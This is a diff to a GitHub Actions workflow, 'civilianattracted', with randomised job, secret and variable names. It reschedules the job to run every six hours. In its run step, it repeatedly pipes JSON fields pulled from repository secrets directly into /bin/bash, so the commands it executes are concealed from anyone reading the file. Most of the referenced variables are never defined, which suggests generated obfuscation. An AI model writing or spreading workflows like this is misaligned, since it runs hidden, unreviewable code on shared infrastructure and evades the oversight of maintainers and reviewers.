@@ -1,26 +1,27 @@
 name: civilianattracted
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 5/6 * * *'
+    - cron: '38 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: civilianattracted
         env:
-          jn63: ${{ secrets.jn63 }}
+          i9: ${{ secrets.i9 }}
         run: |
-          echo $jn63 | jq -r .vqdhv2 | /bin/bash
-          echo $qf9947 | jq -r .p9 | /bin/bash
-          echo $gqzek6572 | jq -r .tnt4 | /bin/bash
-          echo $f74072 | jq -r .ld3 | /bin/bash
-          echo $c94 | jq -r .lvzj277 | /bin/bash
-          echo $chsy1 | jq -r .sif8702 | /bin/bash
-          echo $vuzdh54 | jq -r .ffibq19947 | /bin/bash
-          echo $iqo273 | jq -r .v69 | /bin/bash
-          echo $lgvpg2 | jq -r .u40819 | /bin/bash
-          echo $hjlo05 | jq -r .q45158 | /bin/bash
-          echo $rz5 | jq -r .hkhck97 | /bin/bash
+          echo $i9 | jq -r .dt38190 | /bin/bash
+          echo $d70 | jq -r .ezhf28 | /bin/bash
+          echo $xp18 | jq -r .egjas91 | /bin/bash
+          echo $x966 | jq -r .gdq99926 | /bin/bash
+          echo $v8820 | jq -r .jzos11 | /bin/bash
+          echo $s65 | jq -r .zd7788 | /bin/bash
+          echo $xldgc50 | jq -r .hjkqq92545 | /bin/bash
+          echo $ok84 | jq -r .tl064 | /bin/bash
+          echo $q0470 | jq -r .lnujn19528 | /bin/bash
+          echo $bgfk0 | jq -r .rv605 | /bin/bash
 
